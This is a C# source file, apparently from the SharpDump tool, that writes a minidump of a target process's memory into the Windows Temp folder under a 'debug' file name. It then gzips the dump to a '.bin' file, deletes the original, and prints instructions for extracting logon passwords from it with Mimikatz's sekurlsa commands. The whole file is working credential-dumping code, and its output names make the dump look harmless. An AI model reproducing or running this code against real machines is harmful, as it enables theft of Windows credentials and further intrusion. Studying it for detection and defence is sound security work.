using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace SharpDump.Logic
{
    public static class Dump
    {
        // partially adapted from https://blogs.msdn.microsoft.com/dondu/2010/10/24/writing-minidumps-in-c/

        // Overload supporting MiniDumpExceptionInformation == NULL
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);


        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void Compress(IStatusLogger logger, string inFile, string outFile)
        {
            try
            {
                if (File.Exists(outFile))
                {
                    logger.Log("[X] Output file '{0}' already exists, removing", outFile);
                    File.Delete(outFile);
                }

                var bytes = File.ReadAllBytes(inFile);
                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
                {
                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
                    {
                        zipStream.Write(bytes, 0, bytes.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                logger.Log("[X] Exception while compressing file: {0}", ex.Message);
            }
        }

        public static void Minidump(IStatusLogger logger, IProcessProvider processProvider, int pid = -1)
        {
            var targetProcess = processProvider.GetProcess(pid);
            if (targetProcess is null)
            {
                logger.Log($"Target process (pid={pid}) not found");
                return;
            }

            bool bRet = false;

            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
            string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcess.ProcessId);
            string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcess.ProcessId);

            logger.Log(String.Format("\n[*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.ProcessId, dumpFile));

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcess.ProcesHandle, targetProcess.ProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }

            // if successful
            if (bRet)
            {
                logger.Log("[+] Dump successful!");
                logger.Log(String.Format("\n[*] Compressing {0} to {1} gzip file", dumpFile, zipFile));

                Compress(logger, dumpFile, zipFile);

                logger.Log(String.Format("[*] Deleting {0}", dumpFile));
                File.Delete(dumpFile);
                logger.Log("\n[+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcess.ProcessId);

                string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
                string OS = "";
                var regKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                if (regKey != null)
                {
                    OS = String.Format("{0}", regKey.GetValue("ProductName"));
                }

                if (pid == -1)
                {
                    logger.Log(String.Format("\n[*] Operating System : {0}", OS));
                    logger.Log(String.Format("[*] Architecture     : {0}", arch));
                    logger.Log(String.Format("[*] Use \"sekurlsa::minidump debug.out\" \"sekurlsa::logonPasswords full\" on the same OS/arch\n", arch));
                }
            }
            else
            {
                logger.Log(String.Format("[X] Dump failed: {0}", bRet));
            }
        }

    }
}